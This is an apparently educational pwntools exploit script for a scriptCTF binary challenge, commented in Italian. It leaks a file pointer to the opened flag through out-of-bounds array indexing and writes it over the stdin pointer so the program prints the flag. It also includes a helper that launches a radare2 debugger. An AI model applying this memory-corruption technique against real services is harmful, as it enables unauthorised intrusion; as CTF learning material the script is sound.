#!/usr/bin/env python3
import os
import sys
import subprocess
from pwn import *

exe = ELF("./index-2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

URL = ''
PORT = 0

def start(argv=[], *a, **kw):
    # template fatto da greyhat00 per chi viene dopo.
    # usalo liberamente per imparare e sperimentare.
    # buona fortuna, lettore. Happy pwn!
    if args.R2:
        io = process([exe.path] + argv, *a, **kw)
        # changeme sys.main
        # parametri di r2 personalizzabili
        # es:
        # r2_cmd = "r2 -c 'db sym.foo+122; dc; Vpp; px @ section..got' -d " + str(io.pid)
        r2_cmd = "r2 -c 'db sym.main; dc; Vpp' -d " + str(io.pid)
        
        subprocess.Popen(
            [
            "x-terminal-emulator",                  # open systen default terminal emulator
             "-e", 
             os.environ.get("SHELL", "/bin/sh"),    # execute default shell
             "-c", 
             r2_cmd],                               # with radare2 command
            stdout=subprocess.DEVNULL,
            stderr=subprocess.STDOUT
        )
        # pause the current python script until key pressed
        # manually added to avoid race condition waiting for r2 to start     
        ui.pause()
        return io

    if args.REMOTE:
        try:
            host = sys.argv[1]
            port_val = int(sys.argv[2])
        except (IndexError, ValueError):
            host = URL
            port_val = PORT

        if not host or not port_val:
            log.error(
                "REMOTE mode selected but HOST or PORT is missing or invalid.\n"
                "Usage example:\n"
                "  ./exploit.py REMOTE 8.8.8.8 9999\n"
                "Or set URL and PORT variables in the script."
            )
            exit(1)

        log.info("Connecting to remote"+ str(host) + str(port_val))
        return remote(host, port_val)

    else:
        log.info("Launching local process")
        return process([exe.path] + argv, *a, **kw)


def read_data(index):
    io.sendline(b'2')
    io.sendlineafter(b'Index: ', index)
    io.recvuntil(b'Data: ')
    data = io.recvuntil(b'1. Store')
    data = u64(data[:-8].strip().ljust(8, b'\x00'))
    return data

def store_data(index, data):
    io.sendline(b'1')
    io.sendlineafter(b'Index: ', index)
    io.sendlineafter(b'Data: ', p64(data))

'''
Spiegazione exploit:
Il programma in questione non legge la flag da file, ma crea solo un pointer a file.
Fa un fopen(flag, r), ma il pointer viene solo salvato nello stack e mai usato.

Per leggerlo, dunque, mi occorre usare una funzione che legga da file.
In C, lo stdin (standard input), stdout ecc, sono considerati puntatori a file.

Il gioco allora e' fatto. In ghidra si nota che l'array sta immediatamente sotto
lo spazio adibito a contenere l'indirizzo dello stdin. 

Giocando con gli indici, posso leggere il ptr della flag, scriverlo al posto dello stdin, 
in modo che ogni volta che il programma legge input, legge dal file della flag.
'''


file_pointer_offset = b'8'  # sta ad 8 di distanza dal mio array nello stack (index * 8)
io = start()
io.sendline(b'1337')        # carico nello stack il mio file pointer al file flag
fileptr = read_data(file_pointer_offset)
success(f"file ptr @ {hex(fileptr)}")

stdin_offset = b'-6'                # lo stdin sta a -6 rispetto alla mia posizione 
store_data(stdin_offset, fileptr)

'''
Immediatamente appena sovrascritto il programma entra in un loop infinito, quindi prendo
la prima flag che mi viene stampata e lo chiudo.
'''
data = io.recvregex(rb'scriptCTF\{.*\}', capture=True)
flag = data.group(0).decode()
success(f'Flag: {flag}')

write('flag.txt', flag)
io.close()
 